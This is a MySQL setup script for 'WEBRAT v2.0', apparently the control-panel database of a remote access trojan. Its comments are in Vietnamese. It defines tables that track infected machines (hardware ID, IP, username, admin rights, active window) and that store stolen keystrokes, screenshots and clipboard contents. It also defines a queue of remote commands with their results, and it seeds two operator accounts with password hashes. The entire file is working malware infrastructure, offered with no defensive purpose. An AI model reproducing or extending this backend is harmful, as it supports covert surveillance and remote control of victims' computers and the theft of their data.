-- =====================================================
--  WEBRAT v2.0 - Database Setup
--  Chay file nay 1 lan de tao bang clients + accounts
-- =====================================================

CREATE TABLE IF NOT EXISTS `clients` (
  `id`           INT AUTO_INCREMENT PRIMARY KEY,
  `client_id`    VARCHAR(20) NOT NULL UNIQUE,
  `hwid`         VARCHAR(64) DEFAULT '',
  `loc`          VARCHAR(10)  DEFAULT '',
  `username`     VARCHAR(255) DEFAULT '',
  `pcname`       VARCHAR(100) DEFAULT '',
  `ip`           VARCHAR(45)  DEFAULT '',
  `status`       ENUM('online','recent','away') DEFAULT 'away',
  `active_window` VARCHAR(255) DEFAULT '',
  `asn`          VARCHAR(100) DEFAULT '',
  `hosting`      TINYINT(1)   DEFAULT 0,
  `system_info`  VARCHAR(255) DEFAULT '',
  `last_active`  DATETIME     DEFAULT NULL,
  `debut`        DATETIME     DEFAULT NULL,
  `admin_rights` TINYINT(1)   DEFAULT 0,
  `cpu`          VARCHAR(150) DEFAULT '',
  `gpu`          VARCHAR(150) DEFAULT '',
  `ram`          VARCHAR(50)  DEFAULT '',
  `disk`         VARCHAR(100) DEFAULT '',
  `online_hours` INT          DEFAULT 0,
  `total_hours`  INT          DEFAULT 0,
  `last_ping`    DATETIME     DEFAULT NULL,
  `created_at`   DATETIME     DEFAULT CURRENT_TIMESTAMP,
  `updated_at`   DATETIME     DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `keylogs` (
  `id`          INT AUTO_INCREMENT PRIMARY KEY,
  `client_id`   VARCHAR(20) NOT NULL,
  `window_name` VARCHAR(255) DEFAULT '',
  `text`        TEXT,
  `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_client (`client_id`),
  INDEX idx_time (`captured_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `screenshots` (
  `id`          INT AUTO_INCREMENT PRIMARY KEY,
  `client_id`   VARCHAR(20) NOT NULL,
  `filename`    VARCHAR(255) DEFAULT '',
  `filesize`    INT DEFAULT 0,
  `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_client (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `clipboards` (
  `id`          INT AUTO_INCREMENT PRIMARY KEY,
  `client_id`   VARCHAR(20) NOT NULL,
  `content`     TEXT,
  `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_client (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `commands` (
  `id`          INT AUTO_INCREMENT PRIMARY KEY,
  `client_id`   VARCHAR(20) NOT NULL,
  `command`     TEXT NOT NULL,
  `result`      TEXT,
  `status`      ENUM('pending','done','error') DEFAULT 'pending',
  `created_at`  DATETIME DEFAULT CURRENT_TIMESTAMP,
  `executed_at` DATETIME DEFAULT NULL,
  INDEX idx_client_status (`client_id`, `status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `accounts` (
  `id`            INT AUTO_INCREMENT PRIMARY KEY,
  `username`      VARCHAR(50) NOT NULL UNIQUE,
  `password_hash` VARCHAR(255) NOT NULL,
  `is_active`     TINYINT(1) DEFAULT 1,
  `last_login`    DATETIME DEFAULT NULL,
  `created_at`    DATETIME DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT IGNORE INTO `accounts` (`username`, `password_hash`)
VALUES
  ('segaming',    '$2b$10$9E3Hh83IDNyNoOvwhdK/u.Zt20PRx1Lf2cCXXxnV0/tOBomjCzQIi'),
  ('trananhkhoa', '$2b$10$ntuBwbtYyiCp/pnFDhA9muxt0nDNSOfwfXUnGH89ZEjBlKGzY7fo2');